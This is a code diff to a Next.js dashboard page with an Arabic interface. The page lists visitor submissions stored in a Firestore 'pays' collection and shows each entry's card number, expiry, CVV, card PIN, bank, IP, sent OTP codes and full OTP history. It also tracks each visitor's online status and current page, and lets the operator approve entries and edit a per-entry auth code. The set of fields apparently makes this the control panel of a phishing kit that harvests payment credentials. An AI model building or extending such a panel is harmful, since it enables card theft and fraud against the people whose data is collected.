@@ -2,7 +2,7 @@
 
 import { useState, useEffect } from "react"
 import { useRouter } from "next/navigation"
-import { Trash2, Users, CreditCard, UserCheck, Info } from "lucide-react"
+import { Trash2, Users, CreditCard, UserCheck } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { ar } from "date-fns/locale"
@@ -35,35 +35,14 @@ function useOnlineUsersCount() {
 }
 
 interface Notification {
-  createdDate: string
-  bank: string
-  cardStatus?: string
-  ip?: string
-  cvv: string
-  id: string | "0"
-  expiryDate: string
-  notificationCount: number
-  otp: string
-  otp2: string
-  page: string
-  cardNumber: string
-  country?: string
-  personalInfo: {
-    id?: string | "0"
-    name?: string
+  id: string
+  timestamp: string
+  data: {
+    idNumber: string
+    authCode: string
+    timestamp: string
+    status: string
   }
-  prefix: string
-  status: "pending" | string
-  isOnline?: boolean
-  lastSeen: string
-  pass?: string
-  year: string
-  month: string
-  currantPage?: string
-  allOtps?: string[] | null
-  cardExpiry: string
-  name: string
-  otpCode: string
   phone: string
 }
 
@@ -100,6 +79,7 @@ export default function NotificationsPage() {
   const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
   const [totalVisitors, setTotalVisitors] = useState<number>(0)
   const [cardSubmissions, setCardSubmissions] = useState<number>(0)
+  const [editingAuthCodes, setEditingAuthCodes] = useState<Record<string, string>>({})
   const router = useRouter()
   const onlineUsersCount = useOnlineUsersCount()
 
@@ -130,23 +110,7 @@ export default function NotificationsPage() {
             return { id: doc.id, ...data }
           })
           .filter((notification: any) => !notification.isHidden) as Notification[]
-
-        // Check if there are any new notifications with card info or general info
-        const hasNewCardInfo = notificationsData.some(
-          (notification) =>
-            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
-        )
-        const hasNewGeneralInfo = notificationsData.some(
-          (notification) =>
-            (notification.id) &&
-            !notifications.some((n) => n.id === notification.id ),
-        )
-
-        // Only play notification sound if new card info or general info is added
-        if (hasNewCardInfo || hasNewGeneralInfo) {
-          playNotificationSound()
-        }
-
+        playNotificationSound()
         // Update statistics
         updateStatistics(notificationsData)
 
@@ -167,10 +131,55 @@ export default function NotificationsPage() {
     const totalCount = notificationsData.length
 
     // Card submissions is the count of notifications with card info
-    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length
+    const cardCount = notificationsData.filter((notification: any) => notification.cardNumber).length
 
     setTotalVisitors(totalCount)
     setCardSubmissions(cardCount)
+  }
+
+  const handleAuthCodeChange = (notificationId: string, newAuthCode: string) => {
+    setEditingAuthCodes((prev) => ({
+      ...prev,
+      [notificationId]: newAuthCode,
+    }))
+  }
+
+  const updateAuthCode = async (notificationId: string) => {
+    const newAuthCode = editingAuthCodes[notificationId]
+    if (newAuthCode !== undefined) {
+      try {
+        const docRef = doc(db, "pays", notificationId)
+        await updateDoc(docRef, {
+          "data.authCode": newAuthCode,
+        })
+
+        // Update local state
+        setNotifications((prev) =>
+          prev.map((notification) =>
+            notification.id === notificationId
+              ? {
+                  ...notification,
+                  data: { ...notification.data, authCode: newAuthCode },
+                }
+              : notification,
+          ),
+        )
+
+        // Remove from editing state
+        setEditingAuthCodes((prev) => {
+          const updated = { ...prev }
+          delete updated[notificationId]
+          return updated
+        })
+
+        setMessage(true)
+        setTimeout(() => {
+          setMessage(false)
+        }, 3000)
+      } catch (error) {
+        console.error("Error updating auth code:", error)
+      }
+    }
   }
 
   const handleClearAll = async () => {
@@ -203,7 +212,7 @@ export default function NotificationsPage() {
   const handleApproval = async (state: string, id: string) => {
     const targetPost = doc(db, "pays", id)
     await updateDoc(targetPost, {
-      status: state,
+      "data.status": state,
     })
   }
 
@@ -304,40 +313,61 @@ export default function NotificationsPage() {
               <thead>
                 <tr className="border-b">
                   <th className="px-4 py-3 text-right font-medium text-gray-500">الرقم</th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-500">رمز التحقق</th>
                   <th className="px-4 py-3 text-right font-medium text-gray-500">المعلومات</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">الصفحة الحالية</th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-500">الصفحة</th>
                   <th className="px-4 py-3 text-right font-medium text-gray-500">الوقت</th>
-                  <th className="px-4 py-3 text-center font-medium text-gray-500">الحالة</th>
-                  <th className="px-4 py-3 text-center font-medium text-gray-500">الإجراءات</th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-500">الحالة</th>
+                  <th className="px-4 py-3 text-right font-medium text-gray-500">الإجراءات</th>
                 </tr>
               </thead>
               <tbody>
                 {notifications.map((notification) => (
                   <tr key={notification.id} className="border-b hover:bg-gray-50">
-                    <td className="px-4 py-3">{notification.name || "غير معروف"}</td>
+                    <td className="px-4 py-3">{notification.data.idNumber || "غير معروف"}</td>
+                    <td className="px-4 py-3">
+                      <div className="flex items-center gap-2">
+                        <input
+                          type="text"
+                          value={editingAuthCodes[notification.id] ?? notification.data.authCode}
+                          onChange={(e) => handleAuthCodeChange(notification.id, e.target.value)}
+                          className="px-2 py-1 text-sm border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent min-w-[100px]"
+                          placeholder="رمز التحقق"
+                        />
+                        {editingAuthCodes[notification.id] !== undefined && (
+                          <Button
+                            size="sm"
+                            variant="outline"
+                            onClick={() => updateAuthCode(notification.id)}
+                            className="h-7 px-2 text-xs"
+                          >
+                            حفظ
+                          </Button>
+                        )}
+                      </div>
+                    </td>
                     <td className="px-4 py-3">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.name ? "default" : "destructive"}
+                          variant={(notification as any).name ? "default" : "destructive"}
                           className="rounded-md cursor-pointer"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
-                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {(notification as any).name ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
-                          variant={notification.cardNumber ? "default" : "destructive"}
-                          className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
+                          variant={(notification as any).cardNumber ? "default" : "destructive"}
+                          className={`rounded-md cursor-pointer ${(notification as any).cardNumber ? "bg-green-500" : ""}`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
-                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                          {(notification as any).cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                         </Badge>
-                       
                       </div>
                     </td>
-                    <td className="px-4 py-3">{notification?.currantPage}</td>
+                    <td className="px-4 py-3">{(notification as any)?.currantPage}</td>
                     <td className="px-4 py-3">
-                      {notification.createdDate &&
-                        formatDistanceToNow(new Date(notification.createdDate), {
+                      {(notification as any).createdDate &&
+                        formatDistanceToNow(new Date((notification as any).createdDate), {
                           addSuffix: true,
                           locale: ar,
                         })}
@@ -398,37 +428,62 @@ export default function NotificationsPage() {
                 <CardContent className="p-4">
                   <div className="flex justify-between items-start mb-3">
                     <div>
-                      <div className="font-semibold">{notification.personalInfo?.name || "غير معروف"}</div>
+                      <div className="font-semibold">{(notification as any).personalInfo?.name || "غير معروف"}</div>
                     </div>
                     <UserStatusBadge userId={notification.id} />
                   </div>
 
                   <div className="grid grid-cols-1 gap-3 mb-3">
+                    <div className="space-y-2">
+                      <div className="text-sm">
+                        <span className="font-medium">رمز التحقق:</span>
+                        <div className="flex items-center gap-2 mt-1">
+                          <input
+                            type="text"
+                            value={editingAuthCodes[notification.id] ?? notification.data.authCode}
+                            onChange={(e) => handleAuthCodeChange(notification.id, e.target.value)}
+                            className="px-2 py-1 text-sm border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent flex-1"
+                            placeholder="رمز التحقق"
+                          />
+                          {editingAuthCodes[notification.id] !== undefined && (
+                            <Button
+                              size="sm"
+                              variant="outline"
+                              onClick={() => updateAuthCode(notification.id)}
+                              className="h-7 px-2 text-xs"
+                            >
+                              حفظ
+                            </Button>
+                          )}
+                        </div>
+                      </div>
+                    </div>
+
                     <div className="flex flex-wrap gap-2">
                       <Badge
-                        variant={notification.name ? "default" : "destructive"}
+                        variant={(notification as any).name ? "default" : "destructive"}
                         className="rounded-md cursor-pointer"
                         onClick={() => handleInfoClick(notification, "personal")}
                       >
-                        {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                        {(notification as any).name ? "معلومات شخصية" : "لا يوجد معلومات"}
                       </Badge>
                       <Badge
-                        variant={notification.cardNumber ? "default" : "destructive"}
-                        className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
+                        variant={(notification as any).cardNumber ? "default" : "destructive"}
+                        className={`rounded-md cursor-pointer ${(notification as any).cardNumber ? "bg-green-500" : ""}`}
                         onClick={() => handleInfoClick(notification, "card")}
                       >
-                        {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                        {(notification as any).cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                       </Badge>
                     </div>
 
                     <div className="text-sm">
-                      <span className="font-medium">الصفحة الحالية:</span>  {notification?.currantPage}
+                      <span className="font-medium">الصفحة الحالية:</span> {(notification as any)?.currantPage}
                     </div>
 
                     <div className="text-sm">
                       <span className="font-medium">الوقت:</span>{" "}
-                      {notification.createdDate &&
-                        formatDistanceToNow(new Date(notification.createdDate), {
+                      {(notification as any).createdDate &&
+                        formatDistanceToNow(new Date((notification as any).createdDate), {
                           addSuffix: true,
                           locale: ar,
                         })}
@@ -492,10 +547,10 @@ export default function NotificationsPage() {
                   <span>{selectedNotification.id}</span>
                 </p>
               )}
-              {selectedNotification.name && (
+              {(selectedNotification as any).name && (
                 <p className="flex justify-between">
                   <span className="font-medium">الاسم:</span>
-                  <span>{selectedNotification.name}</span>
+                  <span>{(selectedNotification as any).name}</span>
                 </p>
               )}
               {selectedNotification.phone && (
@@ -508,61 +563,67 @@ export default function NotificationsPage() {
           )}
           {selectedInfo === "card" && selectedNotification && (
             <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
-              {selectedNotification.bank && (
+              {(selectedNotification as any).bank && (
                 <p className="flex justify-between">
                   <span className="font-medium text-gray-700">البنك:</span>
-                  <span className="font-semibold">{selectedNotification.bank}</span>
+                  <span className="font-semibold">{(selectedNotification as any).bank}</span>
                 </p>
               )}
-              {selectedNotification.cardNumber && (
+              {(selectedNotification as any).cardNumber && (
                 <p className="flex justify-between">
                   <span className="font-medium text-gray-700">رقم البطاقة:</span>
                   <span className="font-semibold" dir="ltr">
-                  {selectedNotification.prefix &&  <Badge variant={'outline'} className="bg-blue-100">{selectedNotification.prefix && `  ${selectedNotification.prefix}`}</Badge>}{" "}
-                    <Badge variant={'outline'} className="bg-green-100">{selectedNotification.cardNumber}</Badge>
-
+                    {(selectedNotification as any).prefix && (
+                      <Badge variant={"outline"} className="bg-blue-100">
+                        {(selectedNotification as any).prefix && `  ${(selectedNotification as any).prefix}`}
+                      </Badge>
+                    )}{" "}
+                    <Badge variant={"outline"} className="bg-green-100">
+                      {(selectedNotification as any).cardNumber}
+                    </Badge>
                   </span>
                 </p>
               )}
-              {(selectedNotification.year || selectedNotification.month || selectedNotification.cardExpiry) && (
+              {((selectedNotification as any).year ||
+                (selectedNotification as any).month ||
+                (selectedNotification as any).cardExpiry) && (
                 <p className="flex justify-between">
                   <span className="font-medium text-gray-700">تاريخ الانتهاء:</span>
                   <span className="font-semibold">
-                    {selectedNotification.year && selectedNotification.month
-                      ? `${selectedNotification.year}/${selectedNotification.month}`
-                      : selectedNotification.cardExpiry}
+                    {(selectedNotification as any).year && (selectedNotification as any).month
+                      ? `${(selectedNotification as any).year}/${(selectedNotification as any).month}`
+                      : (selectedNotification as any).cardExpiry}
                   </span>
                 </p>
               )}
-              {selectedNotification.
-              pass && (
+              {(selectedNotification as any).pass && (
                 <p className="flex justify-between">
                   <span className="font-medium text-gray-700">رمز البطاقة:</span>
-                  <span className="font-semibold">{selectedNotification.pass}</span>
+                  <span className="font-semibold">{(selectedNotification as any).pass}</span>
                 </p>
               )}
-              {(selectedNotification.otp || selectedNotification.otpCode) && (
+              {((selectedNotification as any).otp || (selectedNotification as any).otpCode) && (
                 <p className="flex justify-between">
                   <span className="font-medium text-gray-700">رمز التحقق المرسل:</span>
                   <span className="font-semibold">
-                    {selectedNotification.otp}
-                    {selectedNotification.otpCode && ` || ${selectedNotification.otpCode}`}
+                    {(selectedNotification as any).otp}
+                    {(selectedNotification as any).otpCode && ` || ${(selectedNotification as any).otpCode}`}
                   </span>
                 </p>
               )}
-              {selectedNotification.cvv && (
+              {(selectedNotification as any).cvv && (
                 <p className="flex justify-between">
                   <span className="font-medium text-gray-700">رمز الامان:</span>
-                  <span className="font-semibold">{selectedNotification.cvv}</span>
+                  <span className="font-semibold">{(selectedNotification as any).cvv}</span>
                 </p>
               )}
-              {selectedNotification.allOtps &&
-                Array.isArray(selectedNotification.allOtps) &&
-                selectedNotification.allOtps.length > 0 && (
+              {(selectedNotification as any).allOtps &&
+                Array.isArray((selectedNotification as any).allOtps) &&
+                (selectedNotification as any).allOtps.length > 0 && (
                   <div>
                     <span className="font-medium text-gray-700 block mb-2">جميع الرموز:</span>
                     <div className="flex flex-wrap gap-2">
-                      {selectedNotification.allOtps.map((otp, index) => (
+                      {(selectedNotification as any).allOtps.map((otp: string, index: number) => (
                         <Badge key={index} variant="outline" className="bg-gray-100">
                           {otp}
                         </Badge>
